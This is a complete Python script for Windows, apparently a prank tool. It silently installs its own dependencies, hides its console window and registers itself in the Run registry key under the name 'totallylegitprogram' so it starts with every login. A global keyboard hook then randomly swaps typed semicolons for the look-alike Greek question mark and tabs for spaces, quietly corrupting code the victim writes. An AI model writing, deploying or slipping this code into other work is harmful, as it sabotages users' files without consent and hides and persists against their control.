import random
import os
import sys
import threading
import datetime,time
try:
	import win32event, win32api, winerror
except ImportError:
	os.system('pip install pypiwin32')
	import win32event, win32api, winerror
try:
	from pynput import keyboard
	from pynput.keyboard import Key, Controller
except ImportError:
	os.system('pip install pynput')
	from pynput import keyboard
	from pynput.keyboard import Key, Controller
try:
	from winreg import *
except ImportError:
	os.system('pip install winreg')
	import winreg

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit(0)

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "totallylegitprogram",0,REG_SZ, new_file_path)

def main():
	if len(sys.argv)>1:
		hide()
		if sys.argv[1]=="startup":
			#print("test")
			addStartup()
	return True

if __name__ == '__main__':
    main()

def on_release(key):
	pass

def on_press(key):
	try:
		if key.char == ';':
			if random.randint(0,20) == 5:
				keyboard = Controller()
				keyboard.type("\b")
				keyboard.type(u'\u037E')

		if key.char == '	':
			if random.randint(0,20) == 5:
				keyboard = Controller()
				keyboard.type("\b")
				keyboard.type("    ")
		#if key.char == 'q':
		#	exit(0)
	except AttributeError:
		pass

# Collect events until released
with keyboard.Listener( on_press=on_press, on_release=on_release) as listener:
	listener.join()
